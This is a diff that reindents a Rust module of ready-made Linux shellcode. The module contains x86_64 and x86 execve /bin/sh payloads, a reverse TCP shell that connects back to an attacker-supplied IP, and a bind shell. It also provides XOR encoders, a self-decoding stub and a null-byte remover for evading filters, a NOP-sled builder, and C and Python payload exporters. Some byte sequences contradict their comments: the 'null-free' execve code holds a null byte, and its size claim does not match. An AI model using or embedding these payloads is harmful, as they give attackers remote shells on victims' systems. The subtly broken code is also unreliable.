@@ -8,573 +8,573 @@ use super::Architecture;
 /// Shellcode type
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ShellcodeType {
-    /// Execute /bin/sh
-    Execve,
-    /// Reverse TCP shell
-    ReverseTcp,
-    /// Bind TCP shell
-    BindTcp,
-    /// Read file
-    ReadFile,
-    /// Write to stdout
-    Write,
-    /// Exit cleanly
-    Exit,
+  /// Execute /bin/sh
+  Execve,
+  /// Reverse TCP shell
+  ReverseTcp,
+  /// Bind TCP shell
+  BindTcp,
+  /// Read file
+  ReadFile,
+  /// Write to stdout
+  Write,
+  /// Exit cleanly
+  Exit,
 }
 
 /// Linux x86_64 shellcodes
 pub struct LinuxX64;
 
 impl LinuxX64 {
-    /// execve("/bin/sh", NULL, NULL) - 27 bytes
-    /// Null-free, position-independent
-    pub fn execve_sh() -> Vec<u8> {
-        vec![
-            // xor rdx, rdx
-            0x48, 0x31, 0xd2, // xor rsi, rsi
-            0x48, 0x31, 0xf6, // push rdx (null terminator)
-            0x52, // mov rdi, 0x68732f6e69622f ("/bin/sh" reversed)
-            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // push rdi
-            0x53, // mov rdi, rsp (pointer to "/bin/sh")
-            0x48, 0x89, 0xe7, // mov al, 59 (execve syscall)
-            0xb0, 0x3b, // syscall
-            0x0f, 0x05,
-        ]
+  /// execve("/bin/sh", NULL, NULL) - 27 bytes
+  /// Null-free, position-independent
+  pub fn execve_sh() -> Vec<u8> {
+    vec![
+      // xor rdx, rdx
+      0x48, 0x31, 0xd2, // xor rsi, rsi
+      0x48, 0x31, 0xf6, // push rdx (null terminator)
+      0x52, // mov rdi, 0x68732f6e69622f ("/bin/sh" reversed)
+      0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // push rdi
+      0x53, // mov rdi, rsp (pointer to "/bin/sh")
+      0x48, 0x89, 0xe7, // mov al, 59 (execve syscall)
+      0xb0, 0x3b, // syscall
+      0x0f, 0x05,
+    ]
+  }
+
+  /// Reverse TCP shell - connects back to attacker
+  /// IP and port are parameterized
+  pub fn reverse_tcp(ip: [u8; 4], port: u16) -> Vec<u8> {
+    let port_bytes = port.to_be_bytes();
+
+    vec![
+      // socket(AF_INET=2, SOCK_STREAM=1, 0)
+      0x48,
+      0x31,
+      0xc0, // xor rax, rax
+      0x48,
+      0x31,
+      0xff, // xor rdi, rdi
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x48,
+      0x31,
+      0xd2, // xor rdx, rdx
+      0xb0,
+      0x29, // mov al, 41 (socket)
+      0x40,
+      0xb7,
+      0x02, // mov dil, 2 (AF_INET)
+      0x40,
+      0xb6,
+      0x01, // mov sil, 1 (SOCK_STREAM)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0x89,
+      0xc7, // mov rdi, rax (socket fd)
+      // connect(sockfd, addr, sizeof(addr))
+      // Build sockaddr_in on stack
+      0x48,
+      0x31,
+      0xc0, // xor rax, rax
+      0x50, // push rax (padding)
+      0x48,
+      0xb8, // mov rax, <ip:port>
+      0x02,
+      0x00, // AF_INET, padding
+      port_bytes[0],
+      port_bytes[1], // port (big-endian)
+      ip[0],
+      ip[1],
+      ip[2],
+      ip[3], // IP address
+      0x50,  // push rax
+      0x48,
+      0x89,
+      0xe6, // mov rsi, rsp (addr)
+      0xb2,
+      0x10, // mov dl, 16 (sizeof)
+      0xb0,
+      0x2a, // mov al, 42 (connect)
+      0x0f,
+      0x05, // syscall
+      // dup2(sockfd, 0/1/2)
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0xb0,
+      0x21, // mov al, 33 (dup2)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0xff,
+      0xc6, // inc rsi
+      0xb0,
+      0x21, // mov al, 33 (dup2)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0xff,
+      0xc6, // inc rsi
+      0xb0,
+      0x21, // mov al, 33 (dup2)
+      0x0f,
+      0x05, // syscall
+      // execve("/bin/sh", 0, 0)
+      0x48,
+      0x31,
+      0xd2, // xor rdx, rdx
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x52, // push rdx
+      0x48,
+      0xbb,
+      0x2f,
+      0x62,
+      0x69,
+      0x6e,
+      0x2f,
+      0x73,
+      0x68,
+      0x00,
+      0x53, // push /bin/sh
+      0x48,
+      0x89,
+      0xe7, // mov rdi, rsp
+      0xb0,
+      0x3b, // mov al, 59 (execve)
+      0x0f,
+      0x05, // syscall
+    ]
+  }
+
+  /// Bind TCP shell - listens on a port
+  pub fn bind_tcp(port: u16) -> Vec<u8> {
+    let port_bytes = port.to_be_bytes();
+
+    vec![
+      // socket(AF_INET=2, SOCK_STREAM=1, 0)
+      0x48,
+      0x31,
+      0xc0, // xor rax, rax
+      0x48,
+      0x31,
+      0xff, // xor rdi, rdi
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x48,
+      0x31,
+      0xd2, // xor rdx, rdx
+      0xb0,
+      0x29, // mov al, 41 (socket)
+      0x40,
+      0xb7,
+      0x02, // mov dil, 2 (AF_INET)
+      0x40,
+      0xb6,
+      0x01, // mov sil, 1 (SOCK_STREAM)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0x89,
+      0xc7, // mov rdi, rax (sockfd)
+      0x48,
+      0x89,
+      0xc3, // mov rbx, rax (save sockfd)
+      // bind(sockfd, addr, sizeof(addr))
+      0x48,
+      0x31,
+      0xc0, // xor rax, rax
+      0x50, // push rax
+      0x48,
+      0xb8, // mov rax, <port>
+      0x02,
+      0x00, // AF_INET
+      port_bytes[0],
+      port_bytes[1], // port
+      0x00,
+      0x00,
+      0x00,
+      0x00, // INADDR_ANY
+      0x50, // push rax
+      0x48,
+      0x89,
+      0xe6, // mov rsi, rsp
+      0xb2,
+      0x10, // mov dl, 16
+      0xb0,
+      0x31, // mov al, 49 (bind)
+      0x0f,
+      0x05, // syscall
+      // listen(sockfd, 1)
+      0x48,
+      0x89,
+      0xdf, // mov rdi, rbx
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x48,
+      0xff,
+      0xc6, // inc rsi
+      0xb0,
+      0x32, // mov al, 50 (listen)
+      0x0f,
+      0x05, // syscall
+      // accept(sockfd, NULL, NULL)
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x48,
+      0x31,
+      0xd2, // xor rdx, rdx
+      0xb0,
+      0x2b, // mov al, 43 (accept)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0x89,
+      0xc7, // mov rdi, rax (client fd)
+      // dup2(clientfd, 0/1/2)
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0xb0,
+      0x21, // mov al, 33 (dup2)
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0xff,
+      0xc6, // inc rsi
+      0xb0,
+      0x21, // mov al, 33
+      0x0f,
+      0x05, // syscall
+      0x48,
+      0xff,
+      0xc6, // inc rsi
+      0xb0,
+      0x21, // mov al, 33
+      0x0f,
+      0x05, // syscall
+      // execve("/bin/sh", 0, 0)
+      0x48,
+      0x31,
+      0xd2, // xor rdx, rdx
+      0x48,
+      0x31,
+      0xf6, // xor rsi, rsi
+      0x52, // push rdx
+      0x48,
+      0xbb,
+      0x2f,
+      0x62,
+      0x69,
+      0x6e,
+      0x2f,
+      0x73,
+      0x68,
+      0x00,
+      0x53, // push
+      0x48,
+      0x89,
+      0xe7, // mov rdi, rsp
+      0xb0,
+      0x3b, // mov al, 59
+      0x0f,
+      0x05, // syscall
+    ]
+  }
+
+  /// Exit cleanly with exit code
+  pub fn exit(code: u8) -> Vec<u8> {
+    vec![
+      0x48, 0x31, 0xff, // xor rdi, rdi
+      0x40, 0xb7, code, // mov dil, <code>
+      0xb0, 0x3c, // mov al, 60 (exit)
+      0x0f, 0x05, // syscall
+    ]
+  }
+
+  /// Write string to stdout
+  pub fn write_stdout(msg: &[u8]) -> Vec<u8> {
+    let mut shellcode = Vec::new();
+
+    // Push message onto stack (in reverse, 8 bytes at a time)
+    let mut chunks: Vec<&[u8]> = msg.chunks(8).collect();
+    chunks.reverse();
+
+    for chunk in chunks {
+      let mut bytes = [0u8; 8];
+      bytes[..chunk.len()].copy_from_slice(chunk);
+      let value = u64::from_le_bytes(bytes);
+
+      // mov rax, value; push rax
+      shellcode.extend(&[0x48, 0xb8]);
+      shellcode.extend(&value.to_le_bytes());
+      shellcode.push(0x50);
     }
 
-    /// Reverse TCP shell - connects back to attacker
-    /// IP and port are parameterized
-    pub fn reverse_tcp(ip: [u8; 4], port: u16) -> Vec<u8> {
-        let port_bytes = port.to_be_bytes();
+    // write(1, rsp, len)
+    shellcode.extend(&[
+      0xb0, 0x01, // mov al, 1 (write)
+      0x48, 0x89, 0xe6, // mov rsi, rsp
+      0x48, 0x31, 0xff, // xor rdi, rdi
+      0x48, 0xff, 0xc7, // inc rdi (stdout=1)
+    ]);
 
-        vec![
-            // socket(AF_INET=2, SOCK_STREAM=1, 0)
-            0x48,
-            0x31,
-            0xc0, // xor rax, rax
-            0x48,
-            0x31,
-            0xff, // xor rdi, rdi
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x48,
-            0x31,
-            0xd2, // xor rdx, rdx
-            0xb0,
-            0x29, // mov al, 41 (socket)
-            0x40,
-            0xb7,
-            0x02, // mov dil, 2 (AF_INET)
-            0x40,
-            0xb6,
-            0x01, // mov sil, 1 (SOCK_STREAM)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0x89,
-            0xc7, // mov rdi, rax (socket fd)
-            // connect(sockfd, addr, sizeof(addr))
-            // Build sockaddr_in on stack
-            0x48,
-            0x31,
-            0xc0, // xor rax, rax
-            0x50, // push rax (padding)
-            0x48,
-            0xb8, // mov rax, <ip:port>
-            0x02,
-            0x00, // AF_INET, padding
-            port_bytes[0],
-            port_bytes[1], // port (big-endian)
-            ip[0],
-            ip[1],
-            ip[2],
-            ip[3], // IP address
-            0x50,  // push rax
-            0x48,
-            0x89,
-            0xe6, // mov rsi, rsp (addr)
-            0xb2,
-            0x10, // mov dl, 16 (sizeof)
-            0xb0,
-            0x2a, // mov al, 42 (connect)
-            0x0f,
-            0x05, // syscall
-            // dup2(sockfd, 0/1/2)
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0xb0,
-            0x21, // mov al, 33 (dup2)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0xff,
-            0xc6, // inc rsi
-            0xb0,
-            0x21, // mov al, 33 (dup2)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0xff,
-            0xc6, // inc rsi
-            0xb0,
-            0x21, // mov al, 33 (dup2)
-            0x0f,
-            0x05, // syscall
-            // execve("/bin/sh", 0, 0)
-            0x48,
-            0x31,
-            0xd2, // xor rdx, rdx
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x52, // push rdx
-            0x48,
-            0xbb,
-            0x2f,
-            0x62,
-            0x69,
-            0x6e,
-            0x2f,
-            0x73,
-            0x68,
-            0x00,
-            0x53, // push /bin/sh
-            0x48,
-            0x89,
-            0xe7, // mov rdi, rsp
-            0xb0,
-            0x3b, // mov al, 59 (execve)
-            0x0f,
-            0x05, // syscall
-        ]
-    }
+    // Set length
+    let len = msg.len() as u8;
+    shellcode.extend(&[0xb2, len]); // mov dl, len
 
-    /// Bind TCP shell - listens on a port
-    pub fn bind_tcp(port: u16) -> Vec<u8> {
-        let port_bytes = port.to_be_bytes();
+    shellcode.extend(&[0x0f, 0x05]); // syscall
 
-        vec![
-            // socket(AF_INET=2, SOCK_STREAM=1, 0)
-            0x48,
-            0x31,
-            0xc0, // xor rax, rax
-            0x48,
-            0x31,
-            0xff, // xor rdi, rdi
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x48,
-            0x31,
-            0xd2, // xor rdx, rdx
-            0xb0,
-            0x29, // mov al, 41 (socket)
-            0x40,
-            0xb7,
-            0x02, // mov dil, 2 (AF_INET)
-            0x40,
-            0xb6,
-            0x01, // mov sil, 1 (SOCK_STREAM)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0x89,
-            0xc7, // mov rdi, rax (sockfd)
-            0x48,
-            0x89,
-            0xc3, // mov rbx, rax (save sockfd)
-            // bind(sockfd, addr, sizeof(addr))
-            0x48,
-            0x31,
-            0xc0, // xor rax, rax
-            0x50, // push rax
-            0x48,
-            0xb8, // mov rax, <port>
-            0x02,
-            0x00, // AF_INET
-            port_bytes[0],
-            port_bytes[1], // port
-            0x00,
-            0x00,
-            0x00,
-            0x00, // INADDR_ANY
-            0x50, // push rax
-            0x48,
-            0x89,
-            0xe6, // mov rsi, rsp
-            0xb2,
-            0x10, // mov dl, 16
-            0xb0,
-            0x31, // mov al, 49 (bind)
-            0x0f,
-            0x05, // syscall
-            // listen(sockfd, 1)
-            0x48,
-            0x89,
-            0xdf, // mov rdi, rbx
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x48,
-            0xff,
-            0xc6, // inc rsi
-            0xb0,
-            0x32, // mov al, 50 (listen)
-            0x0f,
-            0x05, // syscall
-            // accept(sockfd, NULL, NULL)
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x48,
-            0x31,
-            0xd2, // xor rdx, rdx
-            0xb0,
-            0x2b, // mov al, 43 (accept)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0x89,
-            0xc7, // mov rdi, rax (client fd)
-            // dup2(clientfd, 0/1/2)
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0xb0,
-            0x21, // mov al, 33 (dup2)
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0xff,
-            0xc6, // inc rsi
-            0xb0,
-            0x21, // mov al, 33
-            0x0f,
-            0x05, // syscall
-            0x48,
-            0xff,
-            0xc6, // inc rsi
-            0xb0,
-            0x21, // mov al, 33
-            0x0f,
-            0x05, // syscall
-            // execve("/bin/sh", 0, 0)
-            0x48,
-            0x31,
-            0xd2, // xor rdx, rdx
-            0x48,
-            0x31,
-            0xf6, // xor rsi, rsi
-            0x52, // push rdx
-            0x48,
-            0xbb,
-            0x2f,
-            0x62,
-            0x69,
-            0x6e,
-            0x2f,
-            0x73,
-            0x68,
-            0x00,
-            0x53, // push
-            0x48,
-            0x89,
-            0xe7, // mov rdi, rsp
-            0xb0,
-            0x3b, // mov al, 59
-            0x0f,
-            0x05, // syscall
-        ]
-    }
-
-    /// Exit cleanly with exit code
-    pub fn exit(code: u8) -> Vec<u8> {
-        vec![
-            0x48, 0x31, 0xff, // xor rdi, rdi
-            0x40, 0xb7, code, // mov dil, <code>
-            0xb0, 0x3c, // mov al, 60 (exit)
-            0x0f, 0x05, // syscall
-        ]
-    }
-
-    /// Write string to stdout
-    pub fn write_stdout(msg: &[u8]) -> Vec<u8> {
-        let mut shellcode = Vec::new();
-
-        // Push message onto stack (in reverse, 8 bytes at a time)
-        let mut chunks: Vec<&[u8]> = msg.chunks(8).collect();
-        chunks.reverse();
-
-        for chunk in chunks {
-            let mut bytes = [0u8; 8];
-            bytes[..chunk.len()].copy_from_slice(chunk);
-            let value = u64::from_le_bytes(bytes);
-
-            // mov rax, value; push rax
-            shellcode.extend(&[0x48, 0xb8]);
-            shellcode.extend(&value.to_le_bytes());
-            shellcode.push(0x50);
-        }
-
-        // write(1, rsp, len)
-        shellcode.extend(&[
-            0xb0, 0x01, // mov al, 1 (write)
-            0x48, 0x89, 0xe6, // mov rsi, rsp
-            0x48, 0x31, 0xff, // xor rdi, rdi
-            0x48, 0xff, 0xc7, // inc rdi (stdout=1)
-        ]);
-
-        // Set length
-        let len = msg.len() as u8;
-        shellcode.extend(&[0xb2, len]); // mov dl, len
-
-        shellcode.extend(&[0x0f, 0x05]); // syscall
-
-        shellcode
-    }
+    shellcode
+  }
 }
 
 /// Linux x86 (32-bit) shellcodes
 pub struct LinuxX86;
 
 impl LinuxX86 {
-    /// execve("/bin/sh", NULL, NULL) - 23 bytes
-    pub fn execve_sh() -> Vec<u8> {
-        vec![
-            // xor ecx, ecx
-            0x31, 0xc9, // mul ecx (eax=0, edx=0)
-            0xf7, 0xe1, // push edx (null terminator)
-            0x52, // push "//sh"
-            0x68, 0x2f, 0x2f, 0x73, 0x68, // push "/bin"
-            0x68, 0x2f, 0x62, 0x69, 0x6e, // mov ebx, esp
-            0x89, 0xe3, // mov al, 11 (execve)
-            0xb0, 0x0b, // int 0x80
-            0xcd, 0x80,
-        ]
-    }
+  /// execve("/bin/sh", NULL, NULL) - 23 bytes
+  pub fn execve_sh() -> Vec<u8> {
+    vec![
+      // xor ecx, ecx
+      0x31, 0xc9, // mul ecx (eax=0, edx=0)
+      0xf7, 0xe1, // push edx (null terminator)
+      0x52, // push "//sh"
+      0x68, 0x2f, 0x2f, 0x73, 0x68, // push "/bin"
+      0x68, 0x2f, 0x62, 0x69, 0x6e, // mov ebx, esp
+      0x89, 0xe3, // mov al, 11 (execve)
+      0xb0, 0x0b, // int 0x80
+      0xcd, 0x80,
+    ]
+  }
 
-    /// Exit with code
-    pub fn exit(code: u8) -> Vec<u8> {
-        vec![
-            0x31, 0xdb, // xor ebx, ebx
-            0xb3, code, // mov bl, code
-            0xb0, 0x01, // mov al, 1 (exit)
-            0xcd, 0x80, // int 0x80
-        ]
-    }
+  /// Exit with code
+  pub fn exit(code: u8) -> Vec<u8> {
+    vec![
+      0x31, 0xdb, // xor ebx, ebx
+      0xb3, code, // mov bl, code
+      0xb0, 0x01, // mov al, 1 (exit)
+      0xcd, 0x80, // int 0x80
+    ]
+  }
 }
 
 /// Shellcode encoder
 pub struct Encoder;
 
 impl Encoder {
-    /// XOR encode shellcode with single-byte key
-    pub fn xor_encode(shellcode: &[u8], key: u8) -> Vec<u8> {
-        shellcode.iter().map(|b| b ^ key).collect()
+  /// XOR encode shellcode with single-byte key
+  pub fn xor_encode(shellcode: &[u8], key: u8) -> Vec<u8> {
+    shellcode.iter().map(|b| b ^ key).collect()
+  }
+
+  /// XOR encode with multi-byte key
+  pub fn xor_multi(shellcode: &[u8], key: &[u8]) -> Vec<u8> {
+    shellcode
+      .iter()
+      .enumerate()
+      .map(|(i, b)| b ^ key[i % key.len()])
+      .collect()
+  }
+
+  /// Generate XOR decoder stub + encoded payload (x86_64)
+  pub fn xor_decoder_x64(shellcode: &[u8], key: u8) -> Vec<u8> {
+    let encoded = Self::xor_encode(shellcode, key);
+    let len = encoded.len() as u8;
+
+    let mut result = vec![
+      // jmp short to call
+      0xeb, 0x0d, // decoder:
+      0x5e, // pop rsi (shellcode addr)
+      0x48, 0x31, 0xc9, // xor rcx, rcx
+      0xb1, len, // mov cl, len
+      // loop:
+      0x80, 0x36, key, // xor byte [rsi], key
+      0x48, 0xff, 0xc6, // inc rsi
+      0xe2, 0xf8, // loop -8
+      0xeb, 0x05, // jmp shellcode
+      // call decoder
+      0xe8, 0xee, 0xff, 0xff, 0xff,
+    ];
+
+    result.extend(encoded);
+    result
+  }
+
+  /// Remove null bytes by finding safe XOR key
+  pub fn eliminate_nulls(shellcode: &[u8]) -> Option<(Vec<u8>, u8)> {
+    // Find a key that eliminates all nulls
+    for key in 1..=255u8 {
+      let encoded = Self::xor_encode(shellcode, key);
+      if !encoded.contains(&0) && !encoded.contains(&key) {
+        return Some((encoded, key));
+      }
     }
+    None
+  }
 
-    /// XOR encode with multi-byte key
-    pub fn xor_multi(shellcode: &[u8], key: &[u8]) -> Vec<u8> {
-        shellcode
-            .iter()
-            .enumerate()
-            .map(|(i, b)| b ^ key[i % key.len()])
-            .collect()
-    }
+  /// Alphanumeric encoding (basic - uppercase+lowercase+digits only)
+  pub fn is_alphanumeric(shellcode: &[u8]) -> bool {
+    shellcode
+      .iter()
+      .all(|&b| (b >= b'0' && b <= b'9') || (b >= b'A' && b <= b'Z') || (b >= b'a' && b <= b'z'))
+  }
 
-    /// Generate XOR decoder stub + encoded payload (x86_64)
-    pub fn xor_decoder_x64(shellcode: &[u8], key: u8) -> Vec<u8> {
-        let encoded = Self::xor_encode(shellcode, key);
-        let len = encoded.len() as u8;
+  /// Get shellcode as hex string
+  pub fn to_hex(shellcode: &[u8]) -> String {
+    shellcode.iter().map(|b| format!("\\x{:02x}", b)).collect()
+  }
 
-        let mut result = vec![
-            // jmp short to call
-            0xeb, 0x0d, // decoder:
-            0x5e, // pop rsi (shellcode addr)
-            0x48, 0x31, 0xc9, // xor rcx, rcx
-            0xb1, len, // mov cl, len
-            // loop:
-            0x80, 0x36, key, // xor byte [rsi], key
-            0x48, 0xff, 0xc6, // inc rsi
-            0xe2, 0xf8, // loop -8
-            0xeb, 0x05, // jmp shellcode
-            // call decoder
-            0xe8, 0xee, 0xff, 0xff, 0xff,
-        ];
+  /// Get shellcode as C array
+  pub fn to_c_array(shellcode: &[u8]) -> String {
+    let hex: Vec<String> = shellcode.iter().map(|b| format!("0x{:02x}", b)).collect();
+    format!("unsigned char shellcode[] = {{ {} }};", hex.join(", "))
+  }
 
-        result.extend(encoded);
-        result
-    }
-
-    /// Remove null bytes by finding safe XOR key
-    pub fn eliminate_nulls(shellcode: &[u8]) -> Option<(Vec<u8>, u8)> {
-        // Find a key that eliminates all nulls
-        for key in 1..=255u8 {
-            let encoded = Self::xor_encode(shellcode, key);
-            if !encoded.contains(&0) && !encoded.contains(&key) {
-                return Some((encoded, key));
-            }
-        }
-        None
-    }
-
-    /// Alphanumeric encoding (basic - uppercase+lowercase+digits only)
-    pub fn is_alphanumeric(shellcode: &[u8]) -> bool {
-        shellcode.iter().all(|&b| {
-            (b >= b'0' && b <= b'9') || (b >= b'A' && b <= b'Z') || (b >= b'a' && b <= b'z')
-        })
-    }
-
-    /// Get shellcode as hex string
-    pub fn to_hex(shellcode: &[u8]) -> String {
-        shellcode.iter().map(|b| format!("\\x{:02x}", b)).collect()
-    }
-
-    /// Get shellcode as C array
-    pub fn to_c_array(shellcode: &[u8]) -> String {
-        let hex: Vec<String> = shellcode.iter().map(|b| format!("0x{:02x}", b)).collect();
-        format!("unsigned char shellcode[] = {{ {} }};", hex.join(", "))
-    }
-
-    /// Get shellcode as Python bytes
-    pub fn to_python(shellcode: &[u8]) -> String {
-        let hex: String = shellcode.iter().map(|b| format!("\\x{:02x}", b)).collect();
-        format!("shellcode = b\"{}\"", hex)
-    }
+  /// Get shellcode as Python bytes
+  pub fn to_python(shellcode: &[u8]) -> String {
+    let hex: String = shellcode.iter().map(|b| format!("\\x{:02x}", b)).collect();
+    format!("shellcode = b\"{}\"", hex)
+  }
 }
 
 /// Shellcode builder with fluent API
 pub struct ShellcodeBuilder {
-    code: Vec<u8>,
-    arch: Architecture,
+  code: Vec<u8>,
+  arch: Architecture,
 }
 
 impl ShellcodeBuilder {
-    pub fn new(arch: Architecture) -> Self {
-        Self {
-            code: Vec::new(),
-            arch,
-        }
+  pub fn new(arch: Architecture) -> Self {
+    Self {
+      code: Vec::new(),
+      arch,
+    }
+  }
+
+  pub fn x86_64() -> Self {
+    Self::new(Architecture::X86_64)
+  }
+
+  pub fn x86() -> Self {
+    Self::new(Architecture::X86)
+  }
+
+  /// Add raw bytes
+  pub fn raw(mut self, bytes: &[u8]) -> Self {
+    self.code.extend_from_slice(bytes);
+    self
+  }
+
+  /// Add NOP sled
+  pub fn nop_sled(mut self, count: usize) -> Self {
+    self.code.extend(std::iter::repeat(0x90).take(count));
+    self
+  }
+
+  /// Add execve /bin/sh
+  pub fn execve_sh(mut self) -> Self {
+    let shellcode = match self.arch {
+      Architecture::X86_64 => LinuxX64::execve_sh(),
+      Architecture::X86 => LinuxX86::execve_sh(),
+      _ => LinuxX64::execve_sh(),
+    };
+    self.code.extend(shellcode);
+    self
+  }
+
+  /// Add reverse TCP shell
+  pub fn reverse_shell(mut self, ip: &str, port: u16) -> Self {
+    if self.arch != Architecture::X86_64 {
+      return self;
     }
 
-    pub fn x86_64() -> Self {
-        Self::new(Architecture::X86_64)
+    let parts: Vec<u8> = ip.split('.').filter_map(|s| s.parse().ok()).collect();
+
+    if parts.len() == 4 {
+      let ip_bytes = [parts[0], parts[1], parts[2], parts[3]];
+      self.code.extend(LinuxX64::reverse_tcp(ip_bytes, port));
     }
+    self
+  }
 
-    pub fn x86() -> Self {
-        Self::new(Architecture::X86)
-    }
+  /// XOR encode the current shellcode
+  pub fn xor_encode(mut self, key: u8) -> Self {
+    self.code = Encoder::xor_encode(&self.code, key);
+    self
+  }
 
-    /// Add raw bytes
-    pub fn raw(mut self, bytes: &[u8]) -> Self {
-        self.code.extend_from_slice(bytes);
-        self
-    }
+  /// Get length
+  pub fn len(&self) -> usize {
+    self.code.len()
+  }
 
-    /// Add NOP sled
-    pub fn nop_sled(mut self, count: usize) -> Self {
-        self.code.extend(std::iter::repeat(0x90).take(count));
-        self
-    }
+  /// Check if empty
+  pub fn is_empty(&self) -> bool {
+    self.code.is_empty()
+  }
 
-    /// Add execve /bin/sh
-    pub fn execve_sh(mut self) -> Self {
-        let shellcode = match self.arch {
-            Architecture::X86_64 => LinuxX64::execve_sh(),
-            Architecture::X86 => LinuxX86::execve_sh(),
-            _ => LinuxX64::execve_sh(),
-        };
-        self.code.extend(shellcode);
-        self
-    }
-
-    /// Add reverse TCP shell
-    pub fn reverse_shell(mut self, ip: &str, port: u16) -> Self {
-        if self.arch != Architecture::X86_64 {
-            return self;
-        }
-
-        let parts: Vec<u8> = ip.split('.').filter_map(|s| s.parse().ok()).collect();
-
-        if parts.len() == 4 {
-            let ip_bytes = [parts[0], parts[1], parts[2], parts[3]];
-            self.code.extend(LinuxX64::reverse_tcp(ip_bytes, port));
-        }
-        self
-    }
-
-    /// XOR encode the current shellcode
-    pub fn xor_encode(mut self, key: u8) -> Self {
-        self.code = Encoder::xor_encode(&self.code, key);
-        self
-    }
-
-    /// Get length
-    pub fn len(&self) -> usize {
-        self.code.len()
-    }
-
-    /// Check if empty
-    pub fn is_empty(&self) -> bool {
-        self.code.is_empty()
-    }
-
-    /// Build final shellcode
-    pub fn build(self) -> Vec<u8> {
-        self.code
-    }
+  /// Build final shellcode
+  pub fn build(self) -> Vec<u8> {
+    self.code
+  }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::*;
+  use super::*;
 
-    #[test]
-    fn test_execve_sh_x64() {
-        let sc = LinuxX64::execve_sh();
-        assert!(!sc.is_empty());
-        assert!(sc.len() < 50); // Should be compact
+  #[test]
+  fn test_execve_sh_x64() {
+    let sc = LinuxX64::execve_sh();
+    assert!(!sc.is_empty());
+    assert!(sc.len() < 50); // Should be compact
+  }
+
+  #[test]
+  fn test_exit_x64() {
+    let sc = LinuxX64::exit(0);
+    assert_eq!(sc.len(), 10); // xor rdi,rdi (3) + mov dil,code (3) + mov al,60 (2) + syscall (2)
+  }
+
+  #[test]
+  fn test_xor_encode() {
+    let original = vec![0x41, 0x42, 0x43];
+    let key = 0xFF;
+    let encoded = Encoder::xor_encode(&original, key);
+    let decoded = Encoder::xor_encode(&encoded, key);
+    assert_eq!(original, decoded);
+  }
+
+  #[test]
+  fn test_eliminate_nulls() {
+    let shellcode = vec![0x00, 0x41, 0x00, 0x42];
+    if let Some((encoded, key)) = Encoder::eliminate_nulls(&shellcode) {
+      assert!(!encoded.contains(&0));
+      // Decode should give original
+      let decoded = Encoder::xor_encode(&encoded, key);
+      assert_eq!(decoded, shellcode);
     }
+  }
 
-    #[test]
-    fn test_exit_x64() {
-        let sc = LinuxX64::exit(0);
-        assert_eq!(sc.len(), 10); // xor rdi,rdi (3) + mov dil,code (3) + mov al,60 (2) + syscall (2)
-    }
+  #[test]
+  fn test_to_hex() {
+    let sc = vec![0x41, 0x42];
+    assert_eq!(Encoder::to_hex(&sc), "\\x41\\x42");
+  }
 
-    #[test]
-    fn test_xor_encode() {
-        let original = vec![0x41, 0x42, 0x43];
-        let key = 0xFF;
-        let encoded = Encoder::xor_encode(&original, key);
-        let decoded = Encoder::xor_encode(&encoded, key);
-        assert_eq!(original, decoded);
-    }
+  #[test]
+  fn test_builder() {
+    let sc = ShellcodeBuilder::x86_64().nop_sled(16).execve_sh().build();
 
-    #[test]
-    fn test_eliminate_nulls() {
-        let shellcode = vec![0x00, 0x41, 0x00, 0x42];
-        if let Some((encoded, key)) = Encoder::eliminate_nulls(&shellcode) {
-            assert!(!encoded.contains(&0));
-            // Decode should give original
-            let decoded = Encoder::xor_encode(&encoded, key);
-            assert_eq!(decoded, shellcode);
-        }
-    }
-
-    #[test]
-    fn test_to_hex() {
-        let sc = vec![0x41, 0x42];
-        assert_eq!(Encoder::to_hex(&sc), "\\x41\\x42");
-    }
-
-    #[test]
-    fn test_builder() {
-        let sc = ShellcodeBuilder::x86_64().nop_sled(16).execve_sh().build();
-
-        assert!(sc.len() > 16);
-        assert!(sc[..16].iter().all(|&b| b == 0x90));
-    }
+    assert!(sc.len() > 16);
+    assert!(sc[..16].iter().all(|&b| b == 0x90));
+  }
 }
